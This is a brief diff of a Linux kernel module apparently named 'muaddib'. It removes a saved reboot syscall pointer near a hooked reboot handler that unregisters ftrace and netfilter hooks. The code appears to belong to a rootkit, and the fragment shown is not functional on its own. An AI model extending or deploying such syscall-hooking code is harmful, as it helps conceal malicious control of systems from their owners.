@@ -55,8 +55,6 @@ static void __exit muaddib_cleanup(void){
 
 #ifdef PTREGS_SYSCALL_STUBS
 
-static asmlinkage long (*og_reboot)(const struct pt_regs *);
-
 asmlinkage int muaddib_reboot(const struct pt_regs *regs){
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unreg_nf_hook();
